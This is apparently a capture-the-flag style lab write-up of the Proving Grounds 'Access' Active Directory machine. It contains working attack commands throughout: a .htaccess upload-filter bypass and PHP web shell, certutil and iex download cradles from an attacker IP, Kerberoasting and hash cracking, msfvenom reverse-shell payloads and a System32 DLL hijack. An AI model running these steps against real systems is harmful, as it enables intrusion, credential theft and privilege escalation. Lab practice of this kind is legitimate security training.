# NMAP

```
sudo nmap -sC -sV 192.168.120.187 -oN nmap-access
```

![[PG/Active Directory/attachments/Pasted image 20250707112848.png]]

All ports 

![[PG/Active Directory/attachments/Pasted image 20250707112827.png]]

# Web 

![[PG/Active Directory/attachments/Pasted image 20250707135353.png]]

Possible username list?
![[PG/Active Directory/attachments/Pasted image 20250707135547.png]]

There's an upload image option for buying a ticket?
![[PG/Active Directory/attachments/Pasted image 20250707135706.png]]

Try to upload cheeky simple php web shell
![[PG/Active Directory/attachments/Pasted image 20250707140019.png]]
- extension not allowed

Try a diff extension
![[PG/Active Directory/attachments/Pasted image 20250707141417.png]]
Looks like uploading web-shell.php.jpg was enough to bypass the filter. 

![[PG/Active Directory/attachments/Pasted image 20250707141343.png]]

Interesting
![[PG/Active Directory/attachments/Pasted image 20250707141725.png]]

This uploaded but it's not really functional
![[PG/Active Directory/attachments/Pasted image 20250707141810.png]]

## Ferox 

```
feroxbuster -u http://192.168.120.187/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

# Web (443)

Site looks the same. Checking out page source 

![[PG/Active Directory/attachments/Pasted image 20250707151612.png]]
- TheEvent - v4.6.0
I don't actually see any public exploits for this template 

## Ferox 

```
feroxbuster -u https://access.offsec/ -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox.ssl
```

![[PG/Active Directory/attachments/Pasted image 20250707154027.png]]


# SMB 

This failed but got domain: access.offsec

```
nxc smb 192.168.120.187 -u 'administrator' -p 'administrator' --shares
```

![[PG/Active Directory/attachments/Pasted image 20250707150306.png]]
- add to /etc/hosts

Create quick wordlist using info from website 

![[PG/Active Directory/attachments/Pasted image 20250707150822.png]]

Trying this real quick 
![[PG/Active Directory/attachments/Pasted image 20250707151106.png]]
- nope

No luck with winrm either 

![[PG/Active Directory/attachments/Pasted image 20250707151215.png]]

# RPC 

No luck 

![[PG/Active Directory/attachments/Pasted image 20250707151332.png]]


# LDAP 

![[PG/Active Directory/attachments/Pasted image 20250707152619.png]]
- nope 


# ENUM4LINUX

Also no

![[PG/Active Directory/attachments/Pasted image 20250707152717.png]]

So initial access will have to be from the site. 

# Web App

Googling this - looks like the error can occur because of a misconfigured .htaccess file

![[PG/Active Directory/attachments/Pasted image 20250707154304.png]]

Grabbing hints from this writeup https://motasemhamdan.medium.com/active-directory-pentesting-offensive-security-proving-grounds-access-writeup-ddf4f3c6fcb9

We could upload an “.htaccess” file to instruct the server to treat the “.jpg” extension as a PHP script.

Here's the .htaccess file 

```
echo "AddType application/x-httpd-php .jpg" > .htaccess
```

![[PG/Active Directory/attachments/Pasted image 20250707154446.png]]

Upload this file. 

Cannot see it because it is hidden lol 

Just right click on the uploads and select show hidden files

![[PG/Active Directory/attachments/Pasted image 20250707154937.png]]

Yas
![[PG/Active Directory/attachments/Pasted image 20250707155001.png]]

The file uploaded successfully. Retrying my webshell.

![[PG/Active Directory/attachments/Pasted image 20250707155122.png]]

Got code injection. Reverse shell time. 

Use Ivan Sincek one. 

Set up listener 

```
sudo rlwrap nc -lvnp 135
```

Upload the rev shell.

![[PG/Active Directory/attachments/Pasted image 20250707155526.png]]

Navigate to web shell in browser.

![[PG/Active Directory/attachments/Pasted image 20250707155605.png]]
- click itttt

And I'm in 

![[PG/Active Directory/attachments/Pasted image 20250707155635.png]]

I'm an svc user so likely need to priv esc. 

![[PG/Active Directory/attachments/Pasted image 20250707155712.png]]

Start looking for other creds.. Let's speed this up...

![[PG/Active Directory/attachments/Pasted image 20250707155831.png]]

There is a passwords.txt 

![[PG/Active Directory/attachments/Pasted image 20250707160025.png]]
- looks like defaults...except for the webdav user..


Here are the C:\Users

![[PG/Active Directory/attachments/Pasted image 20250707160236.png]]
- need to pivot to svc_mssql

Apache and MSSQL are service accounts so we can think about searching for SPNs

Try this script suggested from writeup. `Get-SPN.ps1`

```
certutil -urlcache -split -f http://192.168.45.152/Get-SPN.ps1
powershell -ExecutionPolicy Bypass
.\Get-SPN.ps1
```

![[PG/Active Directory/attachments/Pasted image 20250707164436.png]]
- got one SPN -> `MSSQLSvc/DC.access.offsec`

Use `Invoke-Kerberoast.ps1`

https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1

```
Add-Type -AssemblyName System.IdentityModel
```

Then execute 

```
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'
iex(new-object net.webclient).downloadString('http://192.168.45.152:80/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat
```

Well okay then. That worked.

![[PG/Active Directory/attachments/Pasted image 20250707164925.png]]
- got a $krb5tsg for svc_mssql

![[PG/Active Directory/attachments/Pasted image 20250707165021.png]]

Save this hash as mssql.hash

![[PG/Active Directory/attachments/Pasted image 20250707165252.png]]

Crack with hashcat

![[PG/Active Directory/attachments/Pasted image 20250707165751.png]]

```
hashcat -m 13100 mssql.hash /usr/share/wordlists/rockyou.txt
```

Hashcat doesn't like how I saved everything 

![[PG/Active Directory/attachments/Pasted image 20250707165911.png]]

I think I need to remove this part 

![[PG/Active Directory/attachments/Pasted image 20250707165959.png]]

Why is this hash effed up.

Repasting hash and trying diff vim command `:%le` to remove weird indent

Re-trying john

```
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 hash 
```

This hash is not cracking. 

I'm going to try with Rubeus instead. 

```
certutil -urlcache -split -f http://192.168.45.152/Rubeus.exe
```

```
./Rubeus.exe kerberoast /nowrap /simple
```

![[PG/Active Directory/attachments/Pasted image 20250707171317.png]]

Save this hash. Yeah, I think something about the output of Invoke-Kerberoast was weird. 

This cracked easily with hashcat.

```
hashcat -m 13100 rubeus.hash /usr/share/wordlists/rockyou.txt 
```

![[PG/Active Directory/attachments/Pasted image 20250707171807.png]]

So we have creds:
```
svc_mssql:trustno1
```

Confirmed these creds are valid with NXC - but can't login with winrm 

# Impacket-mssqlclient 

```
impacket-mssqlclient server/svc_mssql:trustno1@access.offsec -windows-auth
```

Nooope. This isn't working.

Checking all-ports. There is WinRM running on port 47001

# NXC

```
nxc winrm 192.168.120.187 --port 47001 -u 'svc_mssql' -p 'trustno1'
```

JKKKK

![[PG/Active Directory/attachments/Pasted image 20250707194008.png]]

# Scanning these ephemeral ports

```
sudo nmap -sV -sC -p 49664,49665,49666,49668,49669,49670,49673,49678,49691,49701,49719 192.168.120.187 -oN ephemeral-nmap
```

![[PG/Active Directory/attachments/Pasted image 20250707194459.png]]
- nope

What is 47001?

![[PG/Active Directory/attachments/Pasted image 20250707194525.png]]
- nope
# PowerShell RunAs 

```
$username = 'YourUserName'  # Replace with the desired username
$password = 'YourPassword'  # Replace with the password
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
```

^ maybe

## Here's a Script

https://github.com/antonioCoco/RunasCs/blob/master/Invoke-RunasCs.ps1?source=post_page-----b95d3146cfe9---------------------------------------

### Invoke-RunasCs.ps1

```
certutil -urlcache -split -f http://192.168.45.152/Invoke-RunasCs.ps1
```

![[PG/Active Directory/attachments/Pasted image 20250707195346.png]]

Import it 

```
. ./Invoke-RunasCs.ps1
```


Test executing as mssql user 

```
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"
```


Yay it works!

![[PG/Active Directory/attachments/Pasted image 20250707195627.png]]

### Reverse Shell as Mssql

Get reverse shell using msfvenom 

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=445 -f exe > shell.exe
```

![[PG/Active Directory/attachments/Pasted image 20250707200100.png]]

Transfer 

```
certutil -urlcache -split -f http://192.168.45.152/shell.exe
```

Set up listener on port 445

```
sudo rlwrap nc -lvnp 445
```

Execute with RunAsCs

```
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "shell.exe"
```

![[PG/Active Directory/attachments/Pasted image 20250707200437.png]]

Yay we're now the svc_mssql user!

![[PG/Active Directory/attachments/Pasted image 20250707200510.png]]

Grab the flags 

![[PG/Active Directory/attachments/Pasted image 20250707200754.png]]

# Priv Esc

![[PG/Active Directory/attachments/Pasted image 20250707200644.png]]
- SeMachineAccountPrivilege and SeManageVolumePrivilege are both useful 

## SeManageVolumePrivilege 

Using this tool https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public?source=post_page-----b95d3146cfe9---------------------------------------

Transfer this to the box
```
certutil -urlcache -split -f http://192.168.45.152/SeManageVolumeExploit.exe
```

Execute it 

```
.\SeManageVolumeExploit.exe
```

![[PG/Active Directory/attachments/Pasted image 20250707201923.png]]

Now we can write to the C drive 

Check permissions on C:\Windows\system32

```
icacls C:\Windows\System32
```

![[PG/Active Directory/attachments/Pasted image 20250707202045.png]]

With full write access to this folder, we can hijack any dll. I'll use the same one as the writeup..
tzres.dll
### DLL Hijacking

Targeting systeminfo's tzres.dll

Create a malicious dll with msfvenom 

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.152 LPORT=8888 -f dll -o tzres.dll
```
![[PG/Active Directory/attachments/Pasted image 20250707202651.png]]
Transfer this to the `C:\Windows\System32\wbem` directory 

```
certutil -urlcache -split -f http://192.168.45.152/tzres.dll
```

![[PG/Active Directory/attachments/Pasted image 20250707202819.png]]

Set up listener 

```
sudo rlwrap nc -lvnp 8888
```


Run systeminfo command 

```
systeminfo
```

![[PG/Active Directory/attachments/Pasted image 20250707202947.png]]

EPICCCCC

![[PG/Active Directory/attachments/Pasted image 20250707203015.png]]

Successful dll hijacking!!!

Get the flag.

![[PG/Active Directory/attachments/Pasted image 20250707203110.png]]

